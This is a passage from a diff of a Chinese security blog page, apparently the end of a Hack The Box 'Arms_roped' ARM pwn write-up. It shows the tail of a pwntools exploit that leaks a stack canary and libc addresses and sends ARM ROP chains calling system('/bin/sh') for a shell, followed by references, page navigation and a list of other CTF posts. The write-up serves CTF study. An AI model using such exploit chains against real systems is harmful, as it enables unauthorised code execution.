class="number">0x30</span>))</span><br><span class="line">p.recvuntil(<span class="string">'x'</span>*(<span class="number">0x30</span>))</span><br><span class="line">addr12=p.recvline()</span><br><span class="line">print(addr12)</span><br><span class="line">elf_addr=u32(addr12[<span class="number">1</span>:<span class="number">4</span>].ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))*<span class="number">0x100</span><span class="number">-0x900</span></span><br><span class="line"></span><br><span class="line">addr3=u32(addr12[<span class="number">4</span>:<span class="number">8</span>].ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">'elf_addr=:'</span>+hex(elf_addr))</span><br><span class="line">log.info(<span class="string">'addr4:'</span>+hex(addr3))</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x0000056c : pop &#123;r3, pc&#125;</span></span><br><span class="line"></span><br><span class="line">pop_r3_pc=elf_addr+<span class="number">0x0000056c</span></span><br><span class="line">put_addr_s=elf_addr+<span class="number">0x000087C</span></span><br><span class="line">free_got_addr=elf_addr+e.sym[<span class="string">'free'</span>]</span><br><span class="line">xxx_addr=elf_addr+<span class="number">0x11000</span></span><br><span class="line">xxx3=elf_addr+<span class="number">0x11400</span></span><br><span class="line"><span class="comment">#print(hex(len('quit'+'x'*(0x20-4)+p32(canary)+'xxxx'+'yyyy'+'zzzz'+'qqqq'*2)))</span></span><br><span class="line">p.sendline(<span class="string">'quit'</span>+<span class="string">'\x00'</span>*(<span class="number">0x20</span><span class="number">-4</span>)+p32(canary)+<span class="string">'\x00\x00\x00\x00'</span>+p32(free_got_addr<span class="number">-0x10</span>)+p32(xxx3)+p32(pop_r3_pc)+p32(free_got_addr)+p32(put_addr_s)+p32(<span class="number">0x4001056c</span>)+<span class="string">'qqqq'</span>) </span><br><span class="line"></span><br><span class="line">addrx=p.recvline()</span><br><span class="line">x_addr=u32(addrx[<span class="number">0</span>:<span class="number">4</span>].ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">free_addr=u32(addrx[<span class="number">4</span>:<span class="number">8</span>].ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log,info(hex(x_addr))</span><br><span class="line">log.info(hex(free_addr))</span><br><span class="line">libc_base=x_addr-libc.sym[<span class="string">'free'</span>]</span><br><span class="line"><span class="comment">#system_addr=libc_base+0x000781E7</span></span><br><span class="line"><span class="comment">#00078286</span></span><br><span class="line">system_addr=libc_base+<span class="number">0x0078287</span><span class="comment">#+0x0078161</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bin_sh=libc_base+904760</span></span><br><span class="line">bin_sh=libc_base+<span class="number">0x000dce0c</span></span><br><span class="line">log.info(<span class="string">'libc_base:'</span>+hex(libc_base))</span><br><span class="line">log.info(<span class="string">'system:'</span>+hex(system_addr))</span><br><span class="line">log.info(<span class="string">'bin_sh:'</span>+hex(bin_sh))</span><br><span class="line"><span class="comment">#0x0005be74 : pop &#123;r0, r4, pc&#125;</span></span><br><span class="line"><span class="comment">#pop &#123;r0, r1, ip, lr, pc&#125;</span></span><br><span class="line"><span class="comment">#0x00091204 : pop &#123;r0, r1, ip, lr, pc&#125; 31</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">pop_r0_r4_pc=libc_base+<span class="number">0x0000091274</span> </span><br><span class="line"><span class="comment">#00077E56</span></span><br><span class="line">p.sendline(<span class="string">'quit'</span>+<span class="string">'\x00'</span>*(<span class="number">0x20</span><span class="number">-4</span>)+p32(canary)+<span class="string">'\x00\x00\x00\x00'</span>+p32(xxx3)+p32(xxx3)+p32(pop_r0_r4_pc)+p32(bin_sh)+p32(<span class="number">0</span>)*<span class="number">3</span>+p32(system_addr)+<span class="string">'yyyy'</span>)<span class="comment">#+p32(pop_r0_r4_pc)+p32(bin_sh)+p32(0)+p32(system_addr)+'qqqq') </span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="https://www.jianshu.com/p/a7e2da50263e" target="_blank" rel="noopener">https://www.jianshu.com/p/a7e2da50263e</a></p>
+<p><a href="https://x1ng.top/2020/11/16/arm-pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E8%B7%AF/" target="_blank" rel="noopener">https://x1ng.top/2020/11/16/arm-pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E8%B7%AF/</a></p>
+<p><a href="https://chan-shaw.github.io/2020/03/20/arm%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://chan-shaw.github.io/2020/03/20/arm%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2024/02/15/%E4%BB%8EHTB%20_Arms_roped%E5%88%9D%E8%AF%86arm%E6%9E%B6%E6%9E%84/">从HTB _Arms_roped初识arm架构和qemu</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">lexsd6</a></p>
+        <p><span>发布时间:</span>2024-02-15, 17:47:07</p>
+        <p><span>最后更新:</span>2024-02-15, 17:48:40</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2024/02/15/%E4%BB%8EHTB%20_Arms_roped%E5%88%9D%E8%AF%86arm%E6%9E%B6%E6%9E%84/" title="从HTB _Arms_roped初识arm架构和qemu">lexsd6.github.io/2024/02/15/%E4%BB%8EHTB%20_Arms_roped%E5%88%9D%E8%AF%86arm%E6%9E%B6%E6%9E%84/</a>
+            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2024/02/15/%E4%BB%8EHTB%20_Arms_roped%E5%88%9D%E8%AF%86arm%E6%9E%B6%E6%9E%84/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2023/10/07/Python2%20%E7%8E%AF%E5%A2%83%E5%9C%A8ubuntu22.04%20%E9%85%8D%E7%BD%AE/">
+                    在ubuntu22.04配置Python2环境
+                </a>
+            </div>
+        
+    </nav>
+
+
+
+  
+
+  <!-- code.copy.start -->
+	 <!-- 
+<script src="/js/clipboard.js"></script>
+  -->
+	 <!-- 
+<script src="/js/jquery.min.js"></script>
+ -->
+	 <!-- 
+<script src="/js/clipboard_use.js"></script>
+ -->
+	<script type="text/javascript" src="/js/clipboard.js"></script>
+ 	<script type="text/javascript" src="/js/jquery.min.js"></script>
+	<script type="text/javascript" src="/js/clipboard_use.js"></script>
+
+    <!-- code.copy.end -->
+</article>
+
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#arm环境配置"><span class="toc-text">arm环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu安装与使用"><span class="toc-text">qemu安装与使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#qemu安装"><span class="toc-text">qemu安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#qemu的区别与注意"><span class="toc-text">qemu的区别与注意</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何gdb-qemu程序"><span class="toc-text">如何gdb qemu程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何用pwntools交互"><span class="toc-text">如何用pwntools交互</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#arm-汇编入门知识点小提"><span class="toc-text">arm 汇编入门知识点小提</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解题思路"><span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#参考文献"><span class="toc-text">参考文献</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-4 i,
+        .toc-level-4 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"从HTB _Arms_roped初识arm架构和qemu　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+      <section class="livere" id="comments">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" data-id="city" data-uid="MTAyMC81NDYyMC8zMTA5MQ==">
+    <script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+	
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+	
+       })(document, 'script');
+	
+    </script>
+    <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+
+	</div>
+
+    <!-- City版安装代码已完成 -->
+<script type="text/javascript">
+    
+setInterval(function () {
+    var box = document.querySelector(".trc_rbox_container");
+    if(box) box.outerHTML = "";
+}, 2000);
+document.getElementById("taboola-livere").style='display:none';
+</script>
+</section>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2023/10/07/Python2%20%E7%8E%AF%E5%A2%83%E5%9C%A8ubuntu22.04%20%E9%85%8D%E7%BD%AE/" title="下一篇: 在ubuntu22.04配置Python2环境">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2024/02/15/%E4%BB%8EHTB%20_Arms_roped%E5%88%9D%E8%AF%86arm%E6%9E%B6%E6%9E%84/">从HTB _Arms_roped初识arm架构和qemu</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/10/07/Python2%20%E7%8E%AF%E5%A2%83%E5%9C%A8ubuntu22.04%20%E9%85%8D%E7%BD%AE/">在ubuntu22.04配置Python2环境</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/09/22/msql%E6%95%B0%E6%8D%AE%E5%BA%93-udf-%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/">msql数据库-udf-提权姿势学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/04/20/python-sandbox%20bypass%20'()'%20to%20%20runing%20function/">Python-sandbox bypass '(' and ')' to  calling function</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/29/ELF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90--Program%20header/">ELF文件解析--Program header</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/07/ELF%E6%96%87%E4%BB%B6%E5%A4%B4%E8%A7%A3%E6%9E%90%E5%AD%A6%E4%B9%A0/">ELF文件解析--ELF header 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/10/16/decrypt_safe_linking/">how2heap-decrypt_safe_linking学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/10/02/2022%E5%B7%9D%E6%B8%9D%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B--hard_login/">2022川渝职业技能竞赛初赛--hard_login</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/09/14/%E5%B7%9D%E6%B8%9D%E4%B8%AA%E4%BA%BA%E8%B5%9B-wp/">2022川渝个人赛-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/26/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/">搜索引擎语法学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/06/17/how2heap-fastbin_reverse_into_tcache-%E5%AD%A6%E4%B9%A0/">how2heap-fastbin_reverse_into_tcache-学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/06/15/how2heap-house_of_botcake-%E5%AD%A6%E4%B9%A0/">how2heap-house_of_botcake-学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/16/%E5%9C%A8unity%E4%B8%AD%E4%BD%BF%E7%94%A8DragonBones%E9%AA%A8%E9%AA%BC/">在unity中使用DragonBones骨骼的方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/RITSEC-CTF-2022%20-PWN-hangpwn/">RITSEC-CTF-2022-PWN-hangpwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/03/HTB-Login%20Simulator-pwn-challenge-wp/">HTB-Login Simulator-pwn-challenge-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/26/HTB-baby_ninja_jinja-web-challenge-wp/">HTB-baby_ninja_jinja-web-challenge-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/26/HTB-Neonify-web-challenge-wp/">HTB-Neonify-web-challenge-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/08/HTB-Pandora-wp/">HTB-Pandora-Machine-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/22/HSC2021-CTF/">HSC2021-CTF-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/31/sctf2021-pwn-dataleak/">sctf2021-pwn-dataleak-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/04/%E4%B8%9C%E8%BD%AF/">东软2021CTF--PWN--wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/03/cosy-casino-pwn-challenge-wp/">HTB-cosy_casino-pwn-challenge-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/27/2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E7%A7%8B%E5%AD%A3%E8%B5%9B%E5%8B%87%E8%80%85%E5%B1%B1%E5%B3%B0/">2021年春秋杯网络安全联赛秋季赛勇者山峰-WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/07/Largebin%20Attack%20for%20Glibc%202.31%20%E5%AD%A6%E4%B9%A0/">Large bin Attack for Glibc 2.31 学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/03/%E8%A7%A3%E5%86%B3yelee%E6%A8%A1%E6%9D%BF%E4%B8%8Blive2d%E7%9C%8B%E6%9D%BF%E5%A8%98%E5%92%8Cbusuanzi%E4%B8%8D%E8%92%9C%E5%AD%90%E8%AE%A1%E6%95%B0%E5%86%B2%E7%AA%81/">解决yelee模板下live2d看板娘和busuanzi不蒜子计数冲突</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/02/PWN%20Hunting%20challenge%20%E2%80%94%20HTB/">Hunting— HTB  PWN  challenge</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/20/xman%E7%9A%84leve5%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95(mprotect)%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%A9%E7%94%A8/">xman的leve5另一种解法(mprotect)学习与利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/ctfshow-%E6%9C%88%E9%A5%BC%E6%9D%AF-pwn-wp/">ctfshow-月饼杯2021-pwn-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/16/'could%20not%20patch%20the%20PLT%20stub;%20unexpected%20PLT%20format%20or%20the%20file%20has%20been%20modified%20after%20linking!'%E6%8A%A5%E9%94%99%E7%BC%93%E8%A7%A3%E6%96%B9%E6%B3%95/">\`could not patch the PLT stub; unexpected PLT format or the file has been modified after linking!\`报错缓解方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/03/5%E7%A7%8D%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0php_shellcode/">5种字符'(^.9)'构造php_shellcode</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/17/ractf2021-pwn-ctf/">ractf2021-pwn-ctf</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/28/imaginaryctf2021--pwn-wp/">imaginaryctf2021-pwn-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/12/%E9%AB%98%E7%89%88%E6%9C%AClibc(2.29-2.32)%20off%20by%20null%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/">高版本libc(2.29-2.32) off by null利用姿势笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/26/2021qwb%20pwn%20wp/">2021qwb-pwn-初赛-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/28/ISCC2021%20PWN%20WP/">ISCC2021 PWN部分 WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/ret2dl-resolve%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%B0%8F%E8%AE%B0/">ret2dl-resolve利用方法小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">系统调用与SROP方法学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/02/heap%E6%B3%84%E9%9C%B2%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80tirck/">pwn堆题泄露libc真实地址小tirck</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/28/CTF%202021%20PWN%20babyheap%20%20%E5%A4%8D%E7%8E%B0%E8%AE%B0/">2021*CTF_PWN_babyheap复现记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/25/%E5%85%B3%E4%BA%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(9)/">关于格式化字符串利用——学pwn小记(9)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/17/Tcache%20attack%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(8)/">Tcache attack初学习——学pwn小记(8)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/09/%E4%BB%8E%E5%AF%B9b00k%E9%A2%98%E7%9B%AEwp%E5%AD%A6%E4%B9%A0%E5%88%9D%E4%B9%A0off-by-one%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(7)/">从对b00k题目学习中初习off-by-one——学pwn小记(7)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/08/actf--wp/">ångstromCTF 2021--wp与复现记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/">修改ELF文件libc为指定版本</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/14/%E5%8A%AB%E6%8C%81hook%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(6)/">劫持hook函数——学pwn小记(6)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/11/fastbin%E4%BA%8C%E6%AC%A1%E9%87%8A%E6%94%BE%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(5)/">fastbin二次释放——学pwn小记(5)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/">网鼎杯 2018-Comment  复现笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/">关于sql注入bypass总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/08/%E5%AE%89%E6%B4%B5%E6%9D%AF2019%E5%A4%8D%E7%8E%B0/">安洵杯2019复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/">xman pwn题复现——学pwn小记（4）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/31/flask.request%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7%E6%80%BB%E7%BB%93/">flask.request的内置属性总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/">对php伪协议的归纳</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/21/HWCTF-%E5%8D%8E%E4%B8%BA%E4%BA%91%E5%9C%BAWP/">HWCTF-华为云场WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/16/linux%20%E5%86%85%E7%BD%AE%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/">linux 内置参数整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/">关于jinja2特性对ssti的bypass的影响</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/16/%E5%85%B3%E4%BA%8Ephp%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E6%95%B4%E7%90%86/">php执行与文件系统处理函数整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-wp/">第五届上海市大学生网络安全大赛-初赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/12/ctf-show_%E5%8E%9F%E8%B0%85%E6%9D%AFwp/">ctf-show_原谅杯wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/26/ctf-show%201024%E6%9D%AF/">ctf-show 1024杯</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/15/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(3)/">Linux_x64下的ret2bilc与ret2csu--学习pwn小记(3)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/14/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/">第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp/第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/22/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/">第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/13/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(2)/">学习pwn小记(2)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/10/%E5%AF%B9linux%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%80%BB%E7%BB%93/">对linux 命令执行的总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/">学习pwn小记(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/12/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">关于SQL注入小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/26/%E5%AE%89%E6%81%92DASCTF%207%E6%9C%88%E8%B5%9BWP/">安恒DASCTF 7月赛WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/15/rgbCTF--wp/">sctf2020 pythonbox题目复现小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/18/NahamCon%20CTF%20WP/">NahamCon CTF WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/31/%E5%AF%B9%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/">对于文件包含漏洞的知识梳理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/26/%E5%85%B3%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">关于php反序列化字符逃逸的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/23/%E5%A6%82%E4%BD%95%E8%AE%A9%E6%96%87%E4%BB%B6%E9%87%8CPHP%E4%BB%A3%E7%A0%81%E8%A2%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C/">如何让文件里PHP代码被服务器解析执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/21/%E8%99%8E%E7%AC%A6CTF2020--EasyLogin%20%20%20Write%20%20up/">虎符CTF2020--EasyLogin WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">关于python ssti的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/">关于updatexml()报错注入的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/10/cocos2d%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E6%B1%89%E5%8C%96--Writing%20a%20cocos2d%20application/">cocos2d官方文档汉化--Writing a cocos2d application</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/03/hello-world/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+
+
+</div>
+
+
+
+
+  
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
